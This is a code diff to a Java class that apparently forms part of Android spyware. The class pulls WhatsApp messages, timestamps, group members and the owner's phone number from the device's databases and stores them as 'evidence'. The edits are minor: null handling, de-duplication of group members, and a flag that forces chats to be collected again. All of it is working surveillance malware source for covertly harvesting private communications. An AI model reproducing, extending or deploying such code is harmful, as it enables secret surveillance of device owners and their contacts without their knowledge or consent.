@@ -94,7 +94,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
 
-			if (markup.isMarkup()) {
+			if (!Cfg.REGETCHAT && markup.isMarkup()) {
 				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
 				Enumeration<String> keys = hastableConversationLastIndex.keys();
 
@@ -289,7 +289,7 @@ public class ChatWhatsapp extends SubModuleChat {
 				String remote = cursor.getString(1);
 				// remotes.add(remote);
 				if (remote != null) {
-					groups.put(conversation, clean(remote));
+					addGroup(conversation, clean(remote));
 				}
 				return id;
 			}
@@ -406,7 +406,8 @@ public class ChatWhatsapp extends SubModuleChat {
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
 			boolean incoming = cursor.getInt(4) != 1; // f_c
-			String remote = cursor.getString(5);
+			String remote = clean(cursor.getString(5));
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
 			}
@@ -415,7 +416,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			if (StringUtils.isEmpty(message)) {
 				if (isGroup(conversation) && !StringUtils.isEmpty(remote)) {
 					if (Cfg.DEBUG) {
-						Check.asserts(groupTo(conversation).contains(clean(remote)), "no remote in group: " + remote);
+						Check.asserts(groupTo(conversation).contains(remote), "no remote in group: " + remote);
 					}
 				}
 			} else {
@@ -443,6 +444,9 @@ public class ChatWhatsapp extends SubModuleChat {
 	}
 
 	private String clean(String remote) {
+		if (remote == null) {
+			return null;
+		}
 		// f_9=@s.whatsapp.net
 		return remote.replaceAll(Messages.getString("f_9"), "");
 	}
@@ -454,11 +458,14 @@ public class ChatWhatsapp extends SubModuleChat {
 	private void addGroup(String peer, String remote) {
 		if (Cfg.DEBUG) {
 			Check.requires(isGroup(peer), "peer is not a group: " + peer);
+			Check.log("Adding group " + peer + " : " + remote);
 		}
 		String value;
 		if (groups.containsKey(peer)) {
 			value = groups.get(peer);
-			value += "," + clean(remote);
+			if (!value.contains(remote)) {
+				value += "," + remote;
+			}
 
 		} else {
 			value = remote;
